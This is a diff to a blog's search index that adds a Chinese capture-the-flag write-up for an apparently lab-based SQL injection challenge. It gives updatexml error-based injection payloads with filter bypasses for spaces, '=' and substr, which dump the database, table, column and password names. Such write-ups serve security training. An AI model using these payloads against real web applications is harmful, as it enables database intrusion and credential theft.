@@ -751,6 +751,47 @@
 <li><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4></li>
 <li><h4 id="get的新姿势"><a href="#get的新姿势" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
 </ul>
-<a id="more"></a>]]></content>
+<a id="more"></a>
+
+<ul>
+<li><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>极客大挑战2019SQL系列第三题，经过尝试，union和盲注的一系列函数关键字都被过滤，考虑报错注入。</p>
+</li>
+<li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><ol>
+<li><p>采用updatexml语句进行报错注入。</p>
+<p>本题中空格被过滤，但可以考虑用/**/或（）来绕过；而且大于小于等于号也被过滤，而‘=’在select查询时可用like代替（模糊查询）。</p>
+</li>
+<li><p>爆库名<code>or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))%23</code></p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-10.1.png?raw=true"></p>
+</li>
+<li><p>爆表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or(updatexml(1,concat(0x7e(select(group_concat(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))),0x7e),1))%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-10.2.png?raw=true"></p>
+</li>
+<li><p>爆列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or(updatexml(1,concat(0x7e(select(group_concat(column_name)from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))),0x7e),1))%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-10.3.png?raw=true"></p>
+</li>
+<li><p>爆passwo字段，这里只能显示部分，因为substr被过滤，于是用了个骚操作，left和right各取一段然后手动拼起来。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or(updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsql)),0x7e),1))%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-10.5.png?raw=true"></p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-10.4.png?raw=true"></p>
+</li>
+</ol>
+</li>
+</ul>
+<ul>
+<li><h3 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h3><ul>
+<li><h5 id="extractvalue和updatexml的报错注入"><a href="#extractvalue和updatexml的报错注入" class="headerlink" title="extractvalue和updatexml的报错注入"></a>extractvalue和updatexml的报错注入</h5><p>本质就是在参数中的xpath语句语法错误时，先执行一下xpath语句判断正误，再抛出错误，也就相当于一次查询。</p>
+<p>详情链接<a href="https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html">https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html</a></p>
+</li>
+<li><h5 id="floor式的报错注入"><a href="#floor式的报错注入" class="headerlink" title="floor式的报错注入"></a>floor式的报错注入</h5><p><a href="https://blog.csdn.net/he_and/article/details/80455884">https://blog.csdn.net/he_and/article/details/80455884</a></p>
+</li>
+</ul>
+</li>
+</ul>
+]]></content>
   </entry>
 </search>
